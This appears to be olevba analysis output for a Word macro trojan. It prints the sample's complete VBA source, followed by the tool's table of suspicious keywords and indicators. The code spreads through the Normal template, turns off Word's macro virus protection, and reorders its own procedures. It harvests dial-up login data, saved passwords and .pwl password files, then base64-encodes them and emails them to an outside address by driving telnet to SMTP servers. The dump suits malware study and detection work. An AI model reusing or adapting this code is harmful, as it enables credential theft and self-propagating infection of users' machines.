olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Npr.d-95c2b514768d1c5ffb0359ae1a17779991e35ef5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Npr.d-95c2b514768d1c5ffb0359ae1a17779991e35ef5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Trojan.MSWord.Npr.d-95c2b514768d1c5ffb0359ae1a17779991e35ef5 - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Dial-up_script_checker
Option Explicit
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias _
"FindWindowA" (ByVal lpClassName As Any, _
ByVal lpWindowName As Any) As Long
Function Adapt(Cod As String)
Dim PostCod As String
Dim i As Long
On Error Resume Next
For i = 1 To Len(Cod)
 If i >= 76 And (i Mod 76) = 0 Then
  PostCod = PostCod + Mid(Cod, i, 1) + "#"
  Else
  PostCod = PostCod + Mid(Cod, i, 1)
 End If
Next
Adapt = "#" + PostCod + "#"
End Function
'End Sub
Function SCP()
Dim i As Integer
Dim Tmp As String
Dim Found As Boolean
Dim NUA As String
Dim MScript1 As String
Dim MScript2 As String
Dim NF As Integer

On Error Resume Next
If Application.Visible = False Then
With Application.FileSearch
     .LookIn = "c:\"
     .SearchSubFolders = True
     .FileName = "*.scp"
     .Execute
    Found = False
    For i = 1 To .FoundFiles.Count
     NF = FreeFile
     If InStr(1, .FoundFiles(i), "MyInternet.scp", vbTextCompare) = 0 Then
     Open .FoundFiles(i) For Input Access Read As #NF
      Do While Not EOF(NF)
       Line Input #NF, Tmp
        MScript1 = MScript1 + Chr(13) + Chr(10) + Tmp
        If InStr(1, Tmp, "-.int", vbBinaryCompare) Or InStr(1, Tmp, "-.nt", vbBinaryCompare) Then
        Found = True
        NUA = NUA + Chr(13) + Chr(10) + Tmp
       End If
      Loop
     Close NF
     
     If Len(MScript1) < 5000 And Found = True Then MScript2 = MScript2 + Chr(13) + Chr(10) + .FoundFiles(i) + Chr(13) + Chr(10) + MScript1
     Found = False: Tmp = "": MScript1 = ""
    DoEvents
    End If
    Next i
End With
SCP = NUA + Chr(13) + Chr(10) + MScript2
NF = FreeFile
Open "C:\WINDOWS\MyInternet.scp" For Output Access Write As NF
 Print #NF, SCP
Close NF
Else
NF = FreeFile
On Error GoTo CONEZ
Open "C:\WINDOWS\MyInternet.scp" For Input Access Read As NF
  Do While Not EOF(NF)
  Line Input #NF, Tmp
  SCP = SCP + Tmp
  Loop
 Close #NF
End If
CONEZ:
End Function
' End Sub
Sub Sender_main()

Dim Handle As Long
Dim HandleBW As Long
                      
Dim NoConn_ As String
Dim hwnd As Long
                 
Dim GrabStr As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 14) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim Twnd As String
Dim None As String
Dim RecipientOfMessage_ As String
Dim SenderAddress As String
Dim SenderDomain As String
Dim FNum_ As Integer
Dim Usname
Dim Domain_ As String

On Error Resume Next
If Check_Connection = True Then
RecipientOfMessage_ = "<kashek@usa.net>"

Host(1) = "smtp.mail.ru": Domain_ = "@mail.ru"
Usname = Array("-dima-", "2vasiliy", "521521", "DGabidullin", "Intarsija", "KirovDVP", "Mischelli", "MonitorExpress", "Sveta-P2000", "Voronin_Vladimir", "a_kladenova", "abccondi", "abs", "admiralll", "ako", "alazif", "alcan777", "aleksiv2000", "alena_elena", "alexander555", "alexkis", "alexsar", "alltair", "alt-info", "antares_", "anton76", "artyserg", "arxi77", "asp", "ate", "avatchev", "axel_extr", "balds", "bars-profile", "batsek", "best-njl", "bigmoney4u", "bkp", "braut_99", "broker-nsk", "bxk", "c_service", "carlych", "ciap", "courses", "darlenka", "daswer", "datasave")
Host(2) = "itk2.bas-net.by"
Host(3) = "195.75.32.20"

Loto 3, A()

Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
   If THwnd <> 0 Then
    Twnd = "telnet"
    None = "(none)"
    NoConn_ = "Connect failed"
  Else
   THwnd = FindWindow(CLng(0), "O†‰¡†• - (¡†•)")
   If THwnd <> 0 Then
    Twnd = "O†‰¡†•"
    None = "(¡†•)"
    NoConn_ = "¥ Œ‚ ‹Œ„ˆ‰_ö†¡Š˜"
   Else
   THwnd = FindWindow(CLng(0), "Telnet - (¡†•)")
    Twnd = "telnet"
    None = "(¡†•)"
    NoConn_ = "¥ Œ‚ ‹Œ„ˆ‰_ö†¡Š˜"
   End If
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
DoEvents
For f = 1 To 3
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 70 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), Twnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), NoConn_)
 DoEvents
Loop
Select Case Handle
  Case Is <> 0

Randomize
SenderDomain = Usname(Int(UBound(Usname) * Rnd))
SenderAddress = Usname(Int(UBound(Usname) * Rnd)) + Domain_

SMTP = "helo My" + SenderDomain + "#$$mail from: <" + SenderAddress + ">#$" + "rcpt to: " + RecipientOfMessage_ + "#$data#$" + _
 "From: <" + SenderAddress + ">#" + "To: " + RecipientOfMessage_ + "#" + _
 "Date: " + Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.2#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary=" _
 + Chr(34) + "----=_NextPart" + Chr(34) + "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
Filler SMTP, Handle
Pause 1
GrabStr = Grab + SCP
SMTP = Base64(GrabStr)
SMTP = Adapt(SMTP)
Filler SMTP, Handle
                   
Pause 1
FindPWL i, NPwl()
If i <> 0 Then
 For j = 0 To i - 1
  If FileLen("c:\windows\" + NPwl(j)) <> 688 Then
   SMTP = Base64(NPwl(j))
   SMTP = Adapt(SMTP)
      Title = "#------=_NextPart#Content-Type: application/octet-stream; name=" + Chr(34) _
   + NPwl(j) + Chr(34) + "#Content-Transfer-Encoding: base64#Content-Description: " + _
   NPwl(j) + "(PWL PassWord List)#Content-Disposition: attachment; filename=" _
   + Chr(34) + NPwl(j) + Chr(34) + "#"
      Filler Title, Handle
   Pause 1
   Filler SMTP, Handle
   Pause 1
  End If
 Next
End If
Title = "##------=_NextPart--#.#$quit#"
Filler Title, Handle
Pause 1
Start = Timer
Do Until hwnd <> 0 Or Timer - Start > 120
 hwnd = FindWindow(CLng(0), Twnd)
 DoEvents
Loop
Select Case hwnd
Case Is = 0
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hwnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open "c:\windows\logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), Twnd + " - " + None)
SendMessage HandleBW, CLng(16), ByVal CLng(0), 0
Pause 3
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Pause 3
HandleBW = 0
Handle = 0
End Select
Next
End If
End Sub
Function morf(MyString As String)
Dim NextSub As Long
Dim Counter As Integer
Dim A() As Integer
Dim Code_() As String
Dim i As Long
Dim Pre_ As Long
Dim Resalt As String
On Error Resume Next
NextSub = InStr(1, MyString, "End" + " Sub", vbTextCompare)
Do While NextSub <> 0
Counter = Counter + 1
NextSub = InStr(NextSub + 9, MyString, "End" + " Sub", vbTextCompare)
Loop
ReDim Code_(0 To Counter - 1)

NextSub = -8
For i = 0 To Counter - 1
Pre_ = NextSub + 9
NextSub = InStr(Pre_, MyString, "End" + " Sub", vbTextCompare)
Code_(i) = Mid(MyString, Pre_, NextSub + 9 - Pre_)
Next i
Loto Counter - 1, A()
Resalt = Code_(0)
For i = 1 To Counter - 1
Resalt = Resalt + Code_(A(i))
Next i
morf = Resalt
End Function
' End Sub
Sub Sender()
Dim i As Long
 i = 0
 For i = 0 To 4
  If Check_Connection = True Then
   Sender_main
   Exit Sub
  Else
   Pause 254
  End If
 Next
End Sub
Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub
Sub CopyLines(Source As Object)
On Error Resume Next
     Dim SourceM As Object, TargetM As Object
     Dim n As Long
     Dim Body As String
     Dim VBComponent  As Object
    For Each VBComponent In Source.VBProject.VBComponents
     Set SourceM = VBComponent
     n = SourceM.CodeModule.CountOfLines
     Body = SourceM.CodeModule.Lines(1, 1)
     If InStr(1, Body, "Dial-up_script_checker", vbTextCompare) <> 0 Then
     Body = SourceM.CodeModule.Lines(1, n)
     Body = morf(Body)
     Set TargetM = NormalTemplate.VBProject.VBComponents.Add(1)
     TargetM.CodeModule.AddFromString Body
     TargetM.Name = "MSPluss_SCP"
     End If
   Next
End Sub

Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub
Function Grab()
Dim Tmp As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
On Error Resume Next
If Dir$("c:\windows\edialer.ini") <> "" Then
NF = FreeFile
Open "c:\windows\edialer.ini" For Input Access Read As #NF
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Temp = Temp + Tmp + Chr(10)
  End If
Loop
Close #NF
Temp = Temp + Chr(10) + Chr(13)
End If
If Dir$("C:\Windows\system.ini") <> "" Then
NF = FreeFile
Open "C:\Windows\system.ini" For Input Access Read As #NF
Do While Not EOF(NF)
 Line Input #NF, Tmp
 Counter = Counter + 1
 If Tmp = "[Password Lists]" Then
  Do While Tmp <> ""
  Line Input #NF, Tmp
  Temp = Temp + Chr(10) + Tmp
  Loop
 Exit Do
 End If
   If Counter Mod 20 = 0 Then
   DoEvents
   End If
Loop
End If
Close #NF
Grab = Temp
End Function
' End Sub
Sub AutoOpen()
Dim VBComponent As Object
Dim Yes As Boolean
Dim Body As String
 On Error Resume Next
 Yes = False
 For Each VBComponent In NormalTemplate.VBProject.VBComponents
 Body = VBComponent.CodeModule.Lines(1, 1)
   If InStr(1, Body, "Dial-up_script_checker", vbTextCompare) <> 0 Then
     Yes = True
     Exit For
   End If
 Next
If Yes = False Then
CopyLines MacroContainer
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
NormalTemplate.Save
End Sub

Sub AutoClose()
On Error Resume Next
AutoOpen
End Sub
Function Check_Connection()
Dim CurrWnd As Long
Dim Length As Long
Dim Title As String
  CurrWnd = FindWindow(CLng(0), "")
  CurrWnd = GetWindow(CurrWnd, 0)
    Do While CurrWnd <> 0
       Length = GetWindowTextLength(CurrWnd)
        Title = Space(Length + 1)
    Length = GetWindowText(CurrWnd, Title, Length + 1)
    If InStr(1, Title, "Connected to", vbTextCompare) <> 0 _
     Or InStr(1, Title, "IŒ„ˆ‰_ö†¡Œ ˆ", vbTextCompare) <> 0 Then
     Check_Connection = True
     Exit Function
    End If
    CurrWnd = GetWindow(CurrWnd, 2)
    DoEvents
  Loop
  Check_Connection = False
End Function
' End Sub
Function FindPWL(j As Integer, FindFiles() As String)
ReDim FindFiles(0)
FindFiles(0) = Dir$("c:\windows\*.pwl")
If FindFiles(0) = "" Then
Exit Function
End If
j = 0
Do While FindFiles(0) <> ""
FindFiles(0) = Dir
j = j + 1
Loop
If j > 1 Then
ReDim FindFiles(0 To j - 1)
FindFiles(0) = Dir$("c:\windows\*.pwl")
For j = 1 To j - 1
FindFiles(j) = Dir$
Next j
Else
FindFiles(0) = Dir$("c:\windows\*.pwl")
End If
End Function
' End Sub
Sub AutoExit()
Dim Counter As Integer
Dim i As Integer
Dim VBComp As Object
Dim Body As String

 Application.Visible = False
 Options.SaveNormalPrompt = False
 On Error Resume Next

Counter = Templates.Count
For i = 1 To Counter
 For Each VBComp In Templates(i).VBProject.VBComponents
  Body = VBComp.CodeModule.Lines(1, 1)
  If InStr(1, Body, "Dial-up_script_checker", vbTextCompare) = 0 Then
     With VBComp.CodeModule
       .DeleteLines 1, .CountOfLines
     End With
   If VBComp.Name <> "ThisDocument" Then
   Application.OrganizerDelete Templates(i).Name, VBComp.Name, wdOrganizerObjectProjectItems
   End If
 End If
 Next
Next i

 NormalTemplate.Save
 Tmsn
 Options.VirusProtection = True
End Sub
Function Base64(FirstStr As String)
Dim i As Long
Dim ABC As String
Dim Tmp As String
Dim Char As Byte
Dim Cod As Integer
Dim Roll As Integer
Dim HMask As Integer
Dim LMask As Integer
Dim Shift As Integer

HMask = 252
LMask = 3
Shift = 16
Roll = 0
ABC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

On Error Resume Next
For i = 1 To Len(FirstStr)
Char = Asc(Mid(FirstStr, i, 1))
Cod = ((Char And HMask) \ (LMask + 1)) Or Roll
Roll = (Char And LMask) * Shift
Tmp = Tmp + Mid$(ABC, Cod + 1, 1)
HMask = HMask * 4 And 255
LMask = LMask * 4 + 3
Shift = Shift \ 4
If HMask = 0 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
 HMask = 252
 LMask = 3
 Shift = 16
 Roll = 0
End If
Next

If Shift < 16 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
End If
Cod = ((Len(Tmp)) Mod 4)
If Cod Then
Tmp = Tmp + String$(4 - Cod, "=")
End If
Base64 = Tmp
End Function
' End Sub
Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Randomize
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next
End Function
' End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Sender_main
End Sub
Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open "c:\windows\logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub
Sub Filler(MessStr As String, hwnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hwnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
    If i Mod 380 = 0 Then
    Pause 1
    End If
   Charset = SendMessage(hwnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub

Sub FileOpen()
On Error Resume Next
AutoOpen
Dialogs(80).Show
Sender_main
End Sub


Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |195.75.32.20        |IPv4 address                                 |
|IOC       |user32.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+
